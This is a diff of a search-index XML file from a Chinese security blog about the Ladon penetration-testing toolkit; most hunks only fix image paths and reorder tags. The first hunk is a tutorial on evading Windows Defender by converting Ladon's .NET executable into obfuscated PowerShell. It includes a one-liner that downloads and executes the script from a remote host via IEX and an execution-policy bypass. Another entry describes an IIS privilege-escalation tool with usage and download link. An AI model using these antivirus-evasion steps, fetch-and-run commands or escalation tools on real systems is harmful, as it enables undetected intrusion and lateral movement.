 <h3 id="使用LadonGUI免杀-NET程序"><a href="#使用LadonGUI免杀-NET程序" class="headerlink" title="使用LadonGUI免杀.NET程序"></a>使用LadonGUI免杀.NET程序</h3><p>怎么办？我们需要Ladon扫描内网或进行横向移动，但是EXE被杀了，还有办法吗?答案是有的，记得文章开头说过的话吗，Defender在某些方面是杀能力还是比较差的，如powershell、VBS、java、php啊等脚本类语言，不只是它在这方面，其它专做杀软的在这方面也不是很强。去年发布的Ladon 7.5的GUI版本开始就提供有一些PowerShell加密混淆方法，也包含了EXE转PowerShell，PowerShell转EXE功能，也发布过如何将EXE转成PowerShell的教程，以免杀最新版Ladon为例,首先将ladon.exe拖放至exe/dll(.net)文本框中，然后点击右边的”EXE-&gt;PowerShell”按钮，成功会生成Ladon.ps1，如果你只打算把PS1放在win10机器上使用，也可以转Ladon40.exe,毕竟有几个模块只支持.net4.0，当然转换其它.NET程序也一样。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_6.PNG"></p>
-<p>生成的PS1内容如下，已做好加载，如果是你自己写的程序，只需在第8行开始加入相关参数调用即可。若是Ladon请使用记事本打开ps1文件，复制红线所示@和@里的字符串很长可能有2M<br><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_7.PNG"></p>
-<p>再打开Ladon9.0.ps1或Ladon9.1.ps1找到里面那个很长的加密字符串，将刚转换的加密字符串粘贴替换，注意长度那里也需要替换，大小不对应也会导致PS1加载失败。<br><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_8.PNG"></p>
-<p>若发现哪些模块不可使用，可自行参考WIKI，将缺少的模块名称参数加入<br><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_9.PNG"></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_6.PNG"></p>
+<p>生成的PS1内容如下，已做好加载，如果是你自己写的程序，只需在第8行开始加入相关参数调用即可。若是Ladon请使用记事本打开ps1文件，复制红线所示@和@里的字符串很长可能有2M<br><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_7.PNG"></p>
+<p>再打开Ladon9.0.ps1或Ladon9.1.ps1找到里面那个很长的加密字符串，将刚转换的加密字符串粘贴替换，注意长度那里也需要替换，大小不对应也会导致PS1加载失败。<br><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_8.PNG"></p>
+<p>若发现哪些模块不可使用，可自行参考WIKI，将缺少的模块名称参数加入<br><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_9.PNG"></p>
 <p>转换完成后，我们再测一下20H2的Defender,免杀成功，可以嗨起来了。无论使用远程还是本地加载Ladon.ps1，Defender都不杀了。</p>
 <h3 id="远程加载免杀"><a href="#远程加载免杀" class="headerlink" title="远程加载免杀"></a>远程加载免杀</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell -nop -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_10.PNG"></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_10.PNG"></p>
 <h3 id="本地加载免杀"><a href="#本地加载免杀" class="headerlink" title="本地加载免杀"></a>本地加载免杀</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell -<span class="built_in">exec</span> bypass Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_11.PNG"></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_11.PNG"></p>
 <p>还有另外一个方法，就是自行免杀LadonGo，开源支持全平台。</p>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>大家也可以按照该方法，免杀其它.net写的工具，像Ladon这样一百多个功能的程序都能免杀，相信大部份.net写的程序，应该都能免杀，除非是被Defender重点针对的工具，如mimikat。</p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>Ladon免杀/.NET免杀/Exe2Ps1/Ps12Exe<br><a href="http://k8gege.org/Ladon/Exe2Powershell.html">http://k8gege.org/Ladon/Exe2Powershell.html</a><br>Ladon九种PowerShell命令混淆加密免杀方法<br><a href="http://k8gege.org/Ladon/PowershellEncode.html">http://k8gege.org/Ladon/PowershellEncode.html</a></p>
@@ -3943,8 +4034,8 @@ window.location.href="http://k8gege.org/Ladon/cve-2020-0688.html";
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>CVE-2020-0688</tag>
@@ -4505,8 +4596,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
         <category>嗅探</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Sniffer</tag>
         <tag>FtpSniffer</tag>
         <tag>HttpSniffer</tag>
@@ -4807,8 +4898,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>提权</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -5070,8 +5161,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>密码</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -5289,8 +5380,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Kali</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -5375,8 +5466,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Cobalt Strike</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
       </tags>
   </entry>
@@ -5419,13 +5510,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>
 ]]></content>
       <categories>
-        <category>提权</category>
         <category>Exp</category>
+        <category>提权</category>
       </categories>
       <tags>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -5541,14 +5632,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ActiveMQ</tag>
         <tag>CVE-2016-3088</tag>
@@ -5565,14 +5656,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p>通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程<br><br>Video: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20ThinkPHP%205.x%20RCE%20Exploit.rar" target="_blank" rel="noopener">K8Cscan ThinkPHP 5.x RCE Exploit</a><br></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ThinkPHP</tag>
       </tags>
@@ -5590,14 +5681,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
       </tags>
@@ -5621,14 +5712,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
       </tags>
@@ -5760,8 +5851,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>PowerShell</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>PowerShell</tag>
       </tags>
   </entry>
@@ -5803,9 +5894,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Apache</tag>
         <tag>Solr</tag>
+        <tag>Exp</tag>
         <tag>Ladon</tag>
         <tag>0day</tag>
       </tags>
@@ -5824,8 +5915,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -6089,8 +6180,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Kali</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -6146,8 +6237,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">https://github.com/k8gege/MS17010EXP</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -6252,9 +6343,9 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -6347,8 +6438,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>Struts2</tag>
         <tag>GetShell</tag>
       </tags>
@@ -6365,8 +6456,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -6443,8 +6534,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -6619,12 +6710,12 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 <p>&nbsp;</p>
 <p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
       <categories>
-        <category>提权</category>
         <category>Exp</category>
+        <category>提权</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>MS17010</tag>
         <tag>SMB</tag>
       </tags>
@@ -6722,8 +6813,8 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
       </tags>
@@ -6875,13 +6966,13 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
 <p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Zimbra</tag>
       </tags>
@@ -6904,8 +6995,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>BypassUAC</tag>
       </tags>
   </entry>
@@ -6975,10 +7066,37 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Weblogic</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>全版本IIS提权工具iislpe</title>
+    <url>/p/6b9b3afe.html</url>
+    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
+<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
+<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
+<p><strong>原理:</strong></p>
+<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
+<p><strong>用法:</strong></p>
+<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
+<p>&nbsp; &nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
@@ -7046,8 +7164,8 @@ from pprint import pprint
         <category>工具</category>
         <category>主机发现</category>
         <category>源码</category>
-        <category>嗅探</category>
         <category>内网渗透</category>
+        <category>嗅探</category>
         <category>信息收集</category>
         <category>编程</category>
         <category>Python</category>
@@ -7056,33 +7174,6 @@ from pprint import pprint
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>全版本IIS提权工具iislpe</title>
-    <url>/p/6b9b3afe.html</url>
-    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
-<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
-<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
-<p><strong>原理:</strong></p>
-<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
-<p><strong>用法:</strong></p>
-<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
-<p>&nbsp; &nbsp;&nbsp; </p>
-<p>&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>LPE</tag>
-        <tag>Exp</tag>
-        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
@@ -8265,8 +8356,8 @@ setTimeout("window.location.href='http://k8gege.org/p/Ladon.html'",800);
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
 </search>
